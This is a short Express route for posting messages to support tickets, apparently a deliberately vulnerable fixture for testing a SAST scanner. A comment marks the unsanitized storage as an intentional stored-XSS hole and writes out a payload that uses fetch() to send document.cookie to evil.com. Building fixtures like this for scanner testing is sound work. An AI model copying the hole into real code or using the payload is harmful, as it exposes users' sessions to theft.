'use strict';

const { Router } = require('express');
const { pool } = require('../db');

const router = Router({ mergeParams: true });

router.post('/', async (req, res, next) => {
  try {
    const { id: ticketId } = req.params;
    const { body } = req.body;

    if (!body) {
      return res.status(400).json({ error: 'body is required' });
    }

    const ticket = await pool.query('SELECT id FROM tickets WHERE id = $1', [ticketId]);
    if (ticket.rows.length === 0) {
      return res.status(404).json({ error: 'Ticket not found' });
    }

    // VULNERABILITY (Stored XSS): Message body is stored and returned with no
    // HTML sanitization. An attacker submits:
    //   body: "<script>fetch('https://evil.com?c='+document.cookie)</script>"
    // When a support agent views the ticket in a browser, the script executes
    // in the agent's session, potentially leaking auth tokens.
    // Aikido SAST will flag the unsanitized user input going into storage.
    const result = await pool.query(
      'INSERT INTO ticket_messages (ticket_id, author_id, body) VALUES ($1, $2, $3) RETURNING *',
      [ticketId, req.user.sub, body]
    );

    res.status(201).json(result.rows[0]);
  } catch (err) {
    next(err);
  }
});

module.exports = router;
